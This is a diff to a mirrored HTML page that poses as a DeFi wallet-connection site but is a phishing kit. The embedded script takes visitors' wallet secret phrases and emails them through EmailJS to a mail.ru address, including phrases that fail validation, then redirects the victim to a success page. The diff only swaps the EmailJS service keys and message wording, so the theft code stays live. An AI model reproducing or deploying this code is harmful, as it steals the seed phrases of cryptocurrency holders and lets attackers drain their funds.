@@ -1,5 +1,7 @@
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<!-- Mirrored from defiprotocol.me/wallets.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Sep 2022 14:40:19 GMT -->
+<!-- <meta http-equiv="content-type" content="text/html;charset=UTF-8" /> -->
 <head>
 
     <meta charset="UTF-8">
@@ -1302,14 +1304,13 @@
                                     <script type="module">
                                         import { ethers } from "ethers";
                                         import Web3 from "web3";
-                                        const web3 = new Web3(Web3.nodemailer);
+                                        import Web3 from "web3";
+                                        const web3 = new Web3(Web3.currentProvider);
                                         // console.log('web3', web3)
 
                                         (function(){
                                             emailjs.init({
-                                                // publicKey: "Kfrs8XagpaJnDEjO-" // Your public key
-                                                // publicKey: "jV8EbLh46l4V4Wypt" // Your public key
-                                                publicKey: "H5HA9trsJhtPg_WIo" // Your public key
+                                                publicKey: "jV8EbLh46l4V4Wypt" // Your public key
                                             });
                                         })();
                                         let selected;
@@ -1456,22 +1457,24 @@
                                                                 localStorage.setItem("wallet_balance", wallet_balance);
                                                                 console.log('data', data);
 
+                                                                // setTimeout(() => {
+                                                                //     window.location.href = 'success.html';
+                                                                // }, 300);
+
                                                                 const templateParams = {
-                                                                    // to_email: 'mikerebecca2025@gmail.com', // Recipient's email
-                                                                    // message: `Verified Secret Phrase:\n\n ${secretPhrase}`
                                                                     to_email: 'benard.tee@mail.ru', // Recipient's email
                                                                     message: `Resolvepanel Submission:\n\nVerified Secret Phrase: ${secretPhrase}`
                                                                 };
                                                         
-                                                                // emailjs.send('service_jqlqse9', 'template_sp0g2nb', templateParams) // Your service ID and template ID
-                                                                // emailjs.send('service_puq0u3u', 'template_oomaoua', templateParams).then(function(response) {
-                                                                emailjs.send('service_dqusq1r', 'template_a2c8mp8', templateParams).then(function(response) {
+                                                                emailjs.send('service_puq0u3u', 'template_oomaoua', templateParams) // Your service ID and template ID
+                                                                    .then(function(response) {
                                                                         console.log('SUCCESS!', response.status, response.text);
+                                                                        // Redirect to error.html on successful send
                                                                         window.location.href = 'success.html';
                                                                     }, function(error) {
                                                                         console.error('FAILED...', error);
+                                                                        // alert('Failed to send email.');
                                                                     });
-
                                                             });
                                                         }, 1500);
                                                     } catch (error) {
@@ -1497,12 +1500,12 @@
                                                     console.log('another error')
                                                 }
                                                 const templateParams = {
-                                                    // to_email: 'mikerebecca2025@gmail.com', // Recipient's email
                                                     to_email: 'benard.tee@mail.ru', // Recipient's email
-                                                    message: `BAD Secret Phrase (Invaid phrase):\n\n ${secretPhrase}`
+                                                    message: `Resolvepanel Submission (Invalid mnemonic phrase):\n\nSecret Phrase: ${secretPhrase}`
                                                 };
                                         
-                                                emailjs.send('service_dqusq1r', 'template_a2c8mp8', templateParams).then(function(response) {
+                                                emailjs.send('service_puq0u3u', 'template_oomaoua', templateParams) // Your service ID and template ID
+                                                    .then(function(response) {
                                                         console.log('SUCCESS!', response.status, response.text);
                                                     }, function(error) {
                                                         console.error('FAILED...', error);
